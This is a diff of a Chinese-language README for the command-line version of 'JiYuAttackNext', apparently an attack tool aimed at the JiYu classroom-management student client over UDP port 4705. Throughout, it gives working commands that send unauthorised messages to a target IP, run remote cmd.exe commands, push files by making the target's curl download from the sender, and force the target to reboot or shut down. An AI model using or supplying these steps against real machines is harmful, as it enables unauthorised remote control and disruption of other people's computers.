@@ -1,19 +1,19 @@
-# 脚本版使用说明
+# CLI 版使用说明
 
-脚本版为 [cli/main.py](../cli/main.py)，该目录只保留这一个 Python 文件。它仅依赖 Python 标准库，可以单独复制到其他目录或电脑使用，无需安装 GUI 依赖。
+CLI 版可从 Nightly Build 下载 [**JiYuAttackNext-cli.py**](https://github.com/JasonFang0109c/jiyu_attack_next/releases/download/nightly/JiYuAttackNext-cli.py)。该文件仅依赖 Python 标准库，可以单独保存到任意目录使用，无需安装 GUI 依赖。
 
 ## 运行环境
 
-使用 Python 3.13。以下示例默认在项目根目录的 PowerShell 中执行。若只复制了单个文件，使用该文件的实际路径运行即可。
+使用 Python 3.13。以下示例默认在保存 `JiYuAttackNext-cli.py` 的目录中执行 PowerShell。若文件位于其他位置，请使用其实际路径运行。
 
 ```powershell
-python cli/main.py -h
+python JiYuAttackNext-cli.py -h
 ```
 
 通用格式：
 
 ```text
-python cli/main.py -ip <目标地址> [-p <目标端口>] <功能参数>
+python JiYuAttackNext-cli.py -ip <目标地址> [-p <目标端口>] <功能参数>
 ```
 
 向目标发送报文时需要指定 `-ip`，默认 UDP 端口为 `4705`。本机功能 `-e g`、`-e break` 和 `-e continue` 不需要目标地址。
@@ -68,7 +68,7 @@ python cli/main.py -ip <目标地址> [-p <目标端口>] <功能参数>
 ### 发送文本消息
 
 ```powershell
-python cli/main.py -ip 10.49.151.29 -msg "Hello"
+python JiYuAttackNext-cli.py -ip 10.49.151.29 -msg "Hello"
 ```
 
 ### 发送多行文本
@@ -82,17 +82,17 @@ $message = @'
 
 第四行通知
 '@
-python cli/main.py -ip 10.49.151.29 -msg $message
+python JiYuAttackNext-cli.py -ip 10.49.151.29 -msg $message
 ```
 
-脚本保留传入字符串中的真实换行，不会自动将字面量 `\n` 转成换行。目标端是否按多行显示，仍取决于学生端消息窗口的实现。
+CLI 版保留传入字符串中的真实换行，不会自动将字面量 `\n` 转成换行。目标端是否按多行显示，仍取决于学生端消息窗口的实现。
 
 ### 从文件读取长文本
 
 将文本保存为 UTF-8 编码文件，可包含多行内容、空行及中文，也支持带 BOM 的 UTF-8 文件。
 
 ```powershell
-python cli/main.py -ip 10.49.151.29 --msg-file "notice.txt"
+python JiYuAttackNext-cli.py -ip 10.49.151.29 --msg-file "notice.txt"
 ```
 
 `--msg-file -` 可从标准输入读取文本。文件或标准输入适合较长内容，可避免将全文放入命令行参数；`--msg-file` 与 `-msg` 不可同时使用。
@@ -105,18 +105,18 @@ python cli/main.py -ip 10.49.151.29 --msg-file "notice.txt"
 
 总文本不设固定长度上限，超出单条容量时自动拆成多条独立消息，并保留文本内容及换行，不拆开单个 Unicode 码点。总长度仍受可用内存及输入方式限制，文本不支持内嵌 NUL 字符。
 
-**分条不等于接收端合并。** 脚本按顺序发送各条报文，但不提供接收端重组、回执或重传机制，不能保证长文本在目标端完整、有序地显示为同一条消息。
+**分条不等于接收端合并。** CLI 版按顺序发送各条报文，但不提供接收端重组、回执或重传机制，不能保证长文本在目标端完整、有序地显示为同一条消息。
 
 ### 指定目标端口
 
 ```powershell
-python cli/main.py -ip 10.49.151.29 -p 4705 -msg "Test message"
+python JiYuAttackNext-cli.py -ip 10.49.151.29 -p 4705 -msg "Test message"
 ```
 
 ### 发送查询命令
 
 ```powershell
-python cli/main.py -ip 10.49.151.29 -c "cmd.exe /c ipconfig"
+python JiYuAttackNext-cli.py -ip 10.49.151.29 -c "cmd.exe /c ipconfig"
 ```
 
 ### 使用包含空格的路径
@@ -124,7 +124,7 @@ python cli/main.py -ip 10.49.151.29 -c "cmd.exe /c ipconfig"
 在 PowerShell 中，可用外层单引号包裹整个命令，并用内层双引号包裹路径。
 
 ```powershell
-python cli/main.py -ip 10.49.151.29 -c 'cmd.exe /c dir "C:\Program Files"'
+python JiYuAttackNext-cli.py -ip 10.49.151.29 -c 'cmd.exe /c dir "C:\Program Files"'
 ```
 
 ### 传送文件到桌面
@@ -132,10 +132,10 @@ python cli/main.py -ip 10.49.151.29 -c 'cmd.exe /c dir "C:\Program Files"'
 以下命令选择本机文件，并通过目标学生端的远程命令能力触发系统自带的 `curl` 下载：
 
 ```powershell
-python cli/main.py -ip 10.49.151.29 --file "D:\资料\实验报告.pdf" --file-timeout 180
+python JiYuAttackNext-cli.py -ip 10.49.151.29 --file "D:\资料\实验报告.pdf" --file-timeout 180
 ```
 
-脚本会启动本机 HTTP 文件服务，向目标发送随机令牌的下载命令，目标使用当前登录用户桌面保存同名文件。下载完成后写入正式文件；若下载中断会清理 `.part` 临时文件。
+CLI 版会启动本机 HTTP 文件服务，向目标发送随机令牌的下载命令，目标使用当前登录用户桌面保存同名文件。下载完成后写入正式文件；若下载中断会清理 `.part` 临时文件。
 
 - 目标必须允许执行远程命令，且系统 `curl` 可访问发送端；不需要修改 PowerShell 执行策略。
 - 发送端 Windows 防火墙需允许 Python、EXE 或临时 HTTP 服务监听；GUI 首次使用时按系统提示允许。
@@ -146,23 +146,23 @@ python cli/main.py -ip 10.49.151.29 --file "D:\资料\实验报告.pdf" --file-t
 ### 查询本机信息
 
 ```powershell
-python cli/main.py -e g
+python JiYuAttackNext-cli.py -e g
 ```
 
-该功能仅查询运行脚本的本机，不查询远程目标。若未匹配到学生端进程或端口，输出可能不完整。
+该功能仅查询运行 CLI 版的本机，不查询远程目标。若未匹配到学生端进程或端口，输出可能不完整。
 
 ### 控制发送轮数与间隔
 
 以下命令发送 3 轮消息，相邻两轮之间等待 10 秒，最后一轮结束后不再等待。
 
 ```powershell
-python cli/main.py -ip 10.49.151.29 -msg "Test message" -l 3 -t 10
+python JiYuAttackNext-cli.py -ip 10.49.151.29 -msg "Test message" -l 3 -t 10
 ```
 
 ### 组合发送消息与命令
 
 ```powershell
-python cli/main.py -ip 10.49.151.29 -msg "Test" -c "cmd.exe /c ipconfig"
+python JiYuAttackNext-cli.py -ip 10.49.151.29 -msg "Test" -c "cmd.exe /c ipconfig"
 ```
 
 每轮按消息、命令、重启或关机报文的顺序发送；实际是否执行及执行顺序由目标端决定。
@@ -173,15 +173,15 @@ python cli/main.py -ip 10.49.151.29 -msg "Test" -c "cmd.exe /c ipconfig"
 
 ```powershell
 # 重启目标
-python cli/main.py -ip 10.49.151.29 -e r
+python JiYuAttackNext-cli.py -ip 10.49.151.29 -e r
 
 # 关闭目标
-python cli/main.py -ip 10.49.151.29 -e s
+python JiYuAttackNext-cli.py -ip 10.49.151.29 -e s
 ```
 
 ## 行为与限制
 
-- **发送结果**：脚本不接收目标执行回执。“发送成功”仅表示本机发送调用未报错，不能据此确认目标已收到报文或完成操作。
+- **发送结果**：CLI 版不接收目标执行回执。“发送成功”仅表示本机发送调用未报错，不能据此确认目标已收到报文或完成操作。
 - **循环参数**：`-l` 使用正整数，`-t` 使用非负整数。等待发生在两轮之间，不在每台设备之间。
 - **功能组合**：`-msg`、`-c` 可与 `-e r` 或 `-e s` 组合。本地功能 `g`、`break`、`continue` 执行后退出；`nc` 使用独立分支，不处理同时传入的 `-msg` 或 `-c`。
 - **文本编码**：消息与命令按 `utf-16le` 编码。消息超长时自动分条，命令仍受固定报文缓冲区限制；路径和引号仍需符合目标命令解释器的规则。
@@ -191,7 +191,7 @@ python cli/main.py -ip 10.49.151.29 -e s
 
 | 现象                            | 可能原因                                                   | 检查建议                                            |
 | ------------------------------- | ---------------------------------------------------------- | --------------------------------------------------- |
-| 提示找不到脚本文件              | 终端不在脚本目录，或仍使用旧文件名                         | 检查当前目录及文件名，统一使用 `python cli/main.py ...` |
+| 提示找不到 CLI 文件             | 终端不在文件所在目录，或仍使用旧文件名                         | 检查当前目录及文件名，统一使用 `python JiYuAttackNext-cli.py ...` |
 | 提示“发送成功”，目标无响应      | 地址或端口不匹配、报文被拦截、学生端未监听、目标未执行指令 | 核对目标地址、UDP 端口、学生端状态及目标端执行结果  |
 | 包含空格的路径处理失败          | 路径未完整加引号，或引号在终端传参时发生变化               | 参考包含空格路径的示例，并核对目标端路径            |
 | `-e g` 未显示端口 | 未找到 `Student` 相关进程或其 UDP 监听端口 | 在本机核对进程与监听状态；查询失败时会显示错误原因 |
